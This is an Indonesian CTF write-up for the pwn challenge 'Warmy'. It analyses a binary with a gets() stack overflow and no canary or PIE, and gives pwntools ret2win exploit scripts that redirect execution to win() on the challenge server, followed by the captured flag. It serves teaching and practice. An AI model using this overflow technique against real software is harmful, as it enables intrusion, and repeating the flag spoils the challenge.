# Writeup CTF - Warmy

## Informasi Challenge

- **Judul:** Warmy
- **Kategori:** Pwn
- **Deskripsi:**

> Its Simple

- **Remote**

```text
nc chall.kali-team.online 10023
```

---

# File Challenge

Challenge menyediakan beberapa file:

```text
flag.txt
ld-linux-x86-64.so.2
libc.so.6
warmy
```

---

# Analisis Proteksi Binary

Lakukan pengecekan menggunakan `checksec`:

```bash
checksec --file=warmy
```

Hasil:

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Beberapa poin penting dari hasil tersebut:

- **No Canary** → Stack buffer overflow dapat dilakukan tanpa perlu membocorkan nilai canary.
- **NX Enabled** → Shellcode pada stack tidak dapat dieksekusi.
- **No PIE** → Seluruh alamat fungsi pada binary bersifat tetap.
- **Stripped: No** → Simbol fungsi masih tersedia sehingga fungsi seperti `win()` dapat ditemukan dengan mudah.

Dari karakteristik tersebut dapat disimpulkan bahwa challenge ini merupakan tipe **ret2win**.

---

# Reverse Engineering

Binary dianalisis menggunakan **radare2**.

```bash
r2 -A warmy
```

Daftar fungsi:

```bash
afl
```

Fungsi yang menarik:

```text
0x00401236    sym.win
0x004012ce    sym.vuln
0x004012fd    main
```

Fungsi `main()` hanya melakukan inisialisasi buffering kemudian memanggil `vuln()`.

```c
call sym.vuln
```

---

## Fungsi `win()`

Fungsi `win()` membuka file `flag.txt` kemudian mencetak seluruh isinya.

Potongan disassembly:

```asm
lea rax, str.flag.txt
call sym.imp.fopen

lea rax, str._nThe_Flag:
call sym.imp.printf

call sym.imp.fgetc
call sym.imp.putchar
```

Alamat fungsi:

```text
win = 0x401236
```

---

# Analisis Kerentanan

Fungsi `vuln()` memiliki buffer lokal berukuran **0x40 byte**.

```asm
sub rsp, 0x40
```

Input dibaca menggunakan fungsi berbahaya `gets()`.

```asm
lea rax, [buffer]
call sym.imp.gets
```

Karena `gets()` tidak membatasi panjang input, pengguna dapat menulis melewati batas buffer hingga menimpa **saved RIP**.

Layout stack:

```text
buffer      : 0x40 byte
saved RBP   : 8 byte
saved RIP   : 8 byte
```

Sehingga offset menuju return address adalah:

```text
0x40 + 8 = 72 byte
```

Payload yang dibutuhkan:

```text
'A' * 72 + p64(win)
```

---

# Strategi Eksploitasi

Karena binary **No PIE**, alamat fungsi `win()` selalu tetap.

Eksploitasi cukup dilakukan dengan:

1. Mengisi buffer sebanyak 72 byte.
2. Menimpa return address dengan alamat `win()`.
3. Saat fungsi `vuln()` selesai, eksekusi langsung berpindah ke `win()`, yang kemudian mencetak isi `flag.txt`.

---

# Solver

```python
#!/usr/bin/env python3

from pwn import *

HOST = "chall.kali-team.online"
PORT = 10023

context.binary = elf = ELF("./warmy", checksec=False)
context.log_level = "info"

offset = 72
win = elf.symbols["win"]

payload = b"A" * offset
payload += p64(win)

io = remote(HOST, PORT)
io.recvuntil(b"Hola!")
io.sendline(payload)
io.interactive()
```

---

## Alternatif (Stack Alignment)

Apabila terjadi masalah alignment pada beberapa sistem, tambahkan gadget `ret` sebelum memanggil `win()`.

```python
#!/usr/bin/env python3

from pwn import *

HOST = "chall.kali-team.online"
PORT = 10023

elf = ELF("./warmy", checksec=False)

offset = 72
ret = ROP(elf).find_gadget(["ret"])[0]
win = elf.symbols["win"]

payload = b"A" * offset
payload += p64(ret)
payload += p64(win)

io = remote(HOST, PORT)
io.recvuntil(b"Hola!")
io.sendline(payload)
io.interactive()
```

---

# Menjalankan Exploit

```bash
python3 solve.py
```

Output:

```text
The Flag: KaliTeam{19927c9c-49dc-4d4c-9eed-45d3a95bdb90}
```

---

# Flag

```text
KaliTeam{19927c9c-49dc-4d4c-9eed-45d3a95bdb90}
```

---

